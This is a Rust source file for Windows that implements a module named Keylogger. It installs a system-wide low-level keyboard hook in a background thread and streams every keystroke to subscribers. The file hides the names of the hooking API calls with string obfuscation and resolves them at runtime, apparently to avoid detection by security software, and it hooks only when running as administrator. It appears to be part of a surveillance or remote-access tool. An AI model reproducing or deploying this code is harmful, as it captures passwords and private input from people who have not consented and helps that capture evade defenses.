mod hook;
mod input;

use hook::MODIFIER_STATE;
use input::*;
use std::{
    ffi::CString,
    mem::MaybeUninit,
    ptr::null_mut,
    sync::{mpsc, Mutex},
    time::Duration,
};
use tokio::sync::watch;
use winapi::{
    ctypes::c_int,
    shared::{
        minwindef::{BOOL, DWORD, HINSTANCE},
        windef::HHOOK,
    },
    um::{
        libloaderapi::{GetProcAddress, LoadLibraryA},
        winuser::{DispatchMessageA, GetMessageA, TranslateMessage, HOOKPROC, WH_KEYBOARD_LL},
    },
};

use crate::utils::is_admin;

type TypeSetWindowsHook = unsafe extern "system" fn(c_int, HOOKPROC, HINSTANCE, DWORD) -> HHOOK;
type TypeUnhookWindowsHook = unsafe extern "system" fn(HHOOK) -> BOOL;

lazy_static! {
    static ref GLOBAL_KEYLOGGER: Mutex<Keylogger> = Mutex::new(Keylogger {
        thread: None,
        receiver_count: 0
    });
    static ref REAL_SET_WINDOWS_HOOK: TypeSetWindowsHook = unsafe {
        let lib_name = CString::new(obfstr::obfstr!("user32.dll")).unwrap();
        let fn_name = CString::new(obfstr::obfstr!("SetWindowsHookExA")).unwrap();
        let lib = LoadLibraryA(lib_name.as_ptr());
        std::mem::transmute(GetProcAddress(lib, fn_name.as_ptr()))
    };
    static ref REAL_UNHOOK_WINDOWS_HOOK: TypeUnhookWindowsHook = unsafe {
        let lib_name = CString::new(obfstr::obfstr!("user32.dll")).unwrap();
        let fn_name = CString::new(obfstr::obfstr!("UnhookWindowsHookEx")).unwrap();
        let lib = LoadLibraryA(lib_name.as_ptr());
        std::mem::transmute(GetProcAddress(lib, fn_name.as_ptr()))
    };
}

struct KeyloggerThread {
    kill_tx: mpsc::SyncSender<()>,
}

impl KeyloggerThread {
    fn new() -> Option<Self> {
        let (kill_tx, kill_rx) = mpsc::sync_channel(0);
        let (res_tx, res_rx) = mpsc::sync_channel(1);

        std::thread::spawn(move || {
            let hook_result = setup_ll_keyboard_hook();
            res_tx.send(hook_result.is_some()).unwrap();

            MODIFIER_STATE.reset();

            if let Some(hook) = hook_result {
                let mut msg = MaybeUninit::uninit();
                unsafe {
                    while !KeyloggerThread::check_must_terminate(&kill_rx)
                        && GetMessageA(msg.as_mut_ptr(), null_mut(), 0, 0) != 0
                    {
                        TranslateMessage(msg.as_mut_ptr());
                        DispatchMessageA(msg.as_mut_ptr());
                    }

                    unhook(hook);
                }
            }
        });

        match res_rx.recv_timeout(Duration::from_secs(2)) {
            Ok(true) => Some(KeyloggerThread { kill_tx }),
            _ => None,
        }
    }

    fn check_must_terminate(rx_kill: &mpsc::Receiver<()>) -> bool {
        match rx_kill.try_recv() {
            Ok(_) => true,
            Err(mpsc::TryRecvError::Disconnected) => true,
            _ => false,
        }
    }
}

impl Drop for KeyloggerThread {
    fn drop(&mut self) {
        let _ = self.kill_tx.send(());
    }
}

pub struct Keylogger {
    thread: Option<KeyloggerThread>,
    receiver_count: usize,
}
unsafe impl Send for Keylogger {}

impl Keylogger {
    pub fn subscribe() -> Option<KeyloggerSubscriber> {
        if is_admin() {
            if let Ok(mut gkl) = GLOBAL_KEYLOGGER.lock() {
                if gkl.thread.is_none() {
                    if let Some(thread) = KeyloggerThread::new() {
                        gkl.thread = Some(thread);
                    } else {
                        return None;
                    }
                }

                gkl.receiver_count += 1;
                let rx = hook::KL_CHANNEL.1.clone();
                Some(KeyloggerSubscriber { rx })
            } else {
                None
            }
        } else {
            None
        }
    }
}

pub struct KeyloggerSubscriber {
    pub rx: watch::Receiver<KeyboardInput>,
}

impl Drop for KeyloggerSubscriber {
    fn drop(&mut self) {
        if let Ok(mut gkl) = GLOBAL_KEYLOGGER.lock() {
            gkl.receiver_count -= 1;
            if gkl.receiver_count == 0 {
                gkl.thread.take();
            }
        }
    }
}

fn unhook(hook: HHOOK) -> bool {
    if hook != null_mut() {
        unsafe { REAL_UNHOOK_WINDOWS_HOOK(hook) != 0 }
    } else {
        false
    }
}

fn setup_ll_keyboard_hook() -> Option<HHOOK> {
    let hhook =
        unsafe { REAL_SET_WINDOWS_HOOK(WH_KEYBOARD_LL, Some(hook::keyboard_hook), null_mut(), 0) };

    if hhook != null_mut() {
        Some(hhook)
    } else {
        None
    }
}
